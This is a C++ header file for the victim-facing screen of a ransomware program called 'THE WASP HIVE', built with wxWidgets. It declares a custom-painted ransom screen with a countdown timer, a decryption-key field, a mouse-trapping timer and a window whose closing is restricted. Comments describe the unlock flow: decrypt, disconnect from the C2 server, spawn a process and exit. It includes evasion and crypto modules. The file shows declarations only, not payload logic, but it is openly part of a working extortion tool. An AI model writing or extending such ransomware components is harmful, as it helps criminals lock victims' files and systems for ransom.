// ============================================================================
// gui.h — THE WASP HIVE ransomware screen (wxWidgets, custom painted)
// ============================================================================
// Design: the entire scene is drawn by hand with wxGraphicsContext instead of
// stacking native controls. Native widgets (wxButton / bordered wxTextCtrl)
// break the visual language on both macOS and Windows, so the only real child
// control left is a borderless wxTextCtrl sitting inside a painted "well".
//
// Provides:
//   - PixelDigit        : 7x5 pixel matrices for digits 0-9 + colon
//   - gui::*            : theme colours, font picking, text/rect drawing helpers
//   - ScenePanel        : the painted screen (emblem, cards, timer, input, CTA)
//   - RansomwareFrame   : window, countdown state, unlock flow, mouse trap
//   - RansomwareApp     : wxApp entry point
// ============================================================================
#pragma once

#include <string>
#include <vector>

#include "api_table.h"
#include "evasion.h"
#include "crypto.h"

// Pixel font digit matrices (7x5) — digits 0-9, colon at index 10
class PixelDigit {
public:
    static const int digits[11][7][5];
};

#ifndef HEADLESS

#include <wx/wx.h>
#include <wx/timer.h>
#include <wx/dcbuffer.h>
#include <wx/image.h>

class RansomwareFrame;

// ============================================================================
// gui:: namespace — theme + drawing primitives
// ============================================================================
// Colours are exposed as functions (not namespace-scope constants) so the
// wxColour objects are constructed on first use, never during static init.
// ============================================================================
namespace gui {

const wxColour& BgTop();      // top of the vertical background gradient
const wxColour& BgBottom();   // bottom of the gradient (pure black)
const wxColour& Gold();       // primary brand accent
const wxColour& GoldHi();     // highlighted gold (titles, hover)
const wxColour& GoldDim();    // muted gold (hairlines, eyebrows)
const wxColour& Ink();        // primary body text
const wxColour& InkDim();     // secondary body text
const wxColour& InkFaint();   // tertiary / labels
const wxColour& CardFill();   // card background
const wxColour& CardEdge();   // card border
const wxColour& Danger();     // warnings, wrong-key status
const wxColour& Success();    // decrypt success status
const wxColour& FieldFill();  // decryption key well background

// Display face (condensed, uppercase-friendly), UI body face, and monospace
// face for labels/tracking text. Each picks the first installed candidate.
wxFont DisplayFont(int pointSize, wxFontWeight weight = wxFONTWEIGHT_BOLD);
wxFont BodyFont(int pointSize, wxFontWeight weight = wxFONTWEIGHT_NORMAL);
wxFont MonoFont(int pointSize, wxFontWeight weight = wxFONTWEIGHT_NORMAL);

// Letter-spaced text (tracking). wx has no native tracking, so glyphs are
// placed one by one — needed for the small uppercase labels.
void DrawTracked(wxGraphicsContext* gc, const wxString& text,
                 double x, double y, double tracking);
double TrackedWidth(wxGraphicsContext* gc, const wxString& text, double tracking);

// Greedy word wrap that honours explicit '\n'. Returns the wrapped lines.
std::vector<wxString> Wrap(wxGraphicsContext* gc, const wxString& text, double maxWidth);

// Filled / outlined rounded rectangle.
void FillRound(wxGraphicsContext* gc, const wxRect2DDouble& r, double radius,
               const wxColour& fill);
void StrokeRound(wxGraphicsContext* gc, const wxRect2DDouble& r, double radius,
                 const wxColour& stroke, double width = 1.0);

// Soft radial glow: concentric translucent circles, quadratic falloff.
void RadialGlow(wxGraphicsContext* gc, double cx, double cy, double radius,
                const wxColour& colour, int alpha = 30, int steps = 18);

// Small upward triangle used as the inline warning bullet.
void WarningGlyph(wxGraphicsContext* gc, double x, double y, double size,
                  const wxColour& colour);

} // namespace gui

// ============================================================================
// ScenePanel — the whole ransomware screen, painted in one pass
// ============================================================================
class ScenePanel : public wxPanel {
public:
    explicit ScenePanel(RansomwareFrame* owner);
    ~ScenePanel() override;

    void SetTime(int h, int m, int s);
    void SetStatus(const wxString& text, bool success);

    // The key field is drawn and edited entirely by this panel. A native
    // wxTextCtrl was rejected: on macOS it paints its own blue focus ring and
    // cannot be vertically centred, which broke the theme.
    wxString Key() const { return m_key; }
    void ClearKey() { m_key.clear(); Refresh(); }

    // wxPanel refuses keyboard focus by default — the painted field needs it.
    bool AcceptsFocus() const override { return true; }

    // Paints the whole scene into any graphics context. OnPaint() is a thin
    // wrapper around this, which also makes the screen renderable off-screen
    // (UI snapshots, docs) without a visible window.
    void Render(wxGraphicsContext* gc, int width, int height);

private:
    // Measured card geometry — computed before drawing because the body copy
    // wraps against the card width, and the flow layout needs the height first.
    struct CardMetrics {
        double cardW     = 0;
        double cardX     = 0;
        double cardH     = 0;
        double padX      = 0;
        double textX     = 0;
        double textW     = 0;
        double eyebrowH  = 0;
        double questionH = 0;
        double bodyLineH = 0;
        double pillH     = 0;
        double warnH     = 0;
        std::vector<wxString> bodyLines;
    };

    void OnPaint(wxPaintEvent& event);
    void OnSize(wxSizeEvent& event);
    void OnLeftDown(wxMouseEvent& event);
    void OnLeftUp(wxMouseEvent& event);
    void OnMotion(wxMouseEvent& event);
    void OnLeaveWindow(wxMouseEvent& event);
    void OnCharHook(wxKeyEvent& event);   // control keys: Enter, Back, Esc, paste
    void OnChar(wxKeyEvent& event);       // translated text input
    void OnCaretBlink(wxTimerEvent& event);

    // Repaint hook kept separate from wxWindow::Layout() (which is virtual).
    void UpdateGeometry();
    bool LoadEmblem();
    void DrawBackground(wxGraphicsContext* gc, int w, int h);
    double DrawHeader(wxGraphicsContext* gc, int w, double y);
    CardMetrics MeasureCard(wxGraphicsContext* gc, int w);
    void DrawCard(wxGraphicsContext* gc, double y, const CardMetrics& m);
    void DrawFooter(wxGraphicsContext* gc, int w, double y);

    RansomwareFrame* m_owner;
    wxBitmap         m_emblem;

    wxString m_key;           // decryption key being typed (never rendered raw)
    wxTimer* m_caretTimer;    // blinks the custom caret while the field is focused
    bool     m_caretOn;

    int m_hours, m_minutes, m_seconds;

    wxString m_status;        // inline status line (empty -> default warning)
    bool     m_statusSuccess;

    wxRect m_buttonRect;      // CTA hit area, panel coordinates
    wxRect m_fieldRect;       // decryption key well, panel coordinates
    bool   m_hover;
    bool   m_pressed;
};

// ============================================================================
// RansomwareFrame — countdown, mouse trap, unlock flow
// ============================================================================
class RansomwareFrame : public wxFrame {
public:
    RansomwareFrame();
    ~RansomwareFrame() override;

    // Called by ScenePanel when the CTA fires. Keeps the original flow:
    // correct key -> decrypt, disconnect C2, spawn UserEventAgent, _exit(0).
    void AttemptUnlock(const wxString& key);

    // Puts keyboard focus on the painted key field so typing works instantly.
    void FocusKeyField();

private:
    void OnTimer(wxTimerEvent& event);
    void OnClose(wxCloseEvent& event);
    void OnMouseTracker(wxTimerEvent& event);

    wxTimer*     m_clockTimer;
    wxTimer*     m_mouseTimer;
    ScenePanel*  m_scene;
    int          m_hours, m_minutes, m_seconds;
    bool         m_canClose;
};

// wxApp entry point for the ransomware GUI
class RansomwareApp : public wxApp {
public:
    bool OnInit() override;
};

#endif // HEADLESS
